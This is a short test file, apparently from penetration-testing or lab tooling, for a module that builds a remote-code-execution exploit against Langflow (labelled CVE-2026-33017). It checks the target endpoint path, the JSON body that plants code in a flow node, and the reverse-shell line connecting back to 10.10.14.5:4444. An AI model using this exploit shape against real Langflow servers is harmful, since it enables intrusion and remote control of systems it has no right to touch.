import { expect, it } from "vitest";
import { buildLangflowRceBody, buildLangflowRcePath, LANGFLOW_RCE_CODE } from "./langflowRcePayload";

it("builds the CVE-2026-33017 endpoint path from a flow id", () => {
  expect(buildLangflowRcePath("abc-123")).toBe("/api/v1/build_public_tmp/abc-123/flow");
});

it("embeds the code in the exact node.template.code.value shape the advisory describes", () => {
  const code = LANGFLOW_RCE_CODE.replace("{LHOST}", "10.10.14.5").replace("{LPORT}", "4444");
  const body = JSON.parse(buildLangflowRceBody(code));
  expect(body.data.nodes[0].data.node.template.code.value).toBe(code);
  expect(body.data.nodes[0].type).toBe("genericNode");
  expect(body.data.nodes[0].data.type).toBe("ExploitComp");
  expect(body.data.edges).toEqual([]);
  expect(body.inputs).toBeNull();
});

it("substitutes LHOST/LPORT into the reverse shell code", () => {
  const code = LANGFLOW_RCE_CODE.replace("{LHOST}", "10.10.14.5").replace("{LPORT}", "4444");
  expect(code).toContain('_s.connect(("10.10.14.5",4444))');
});
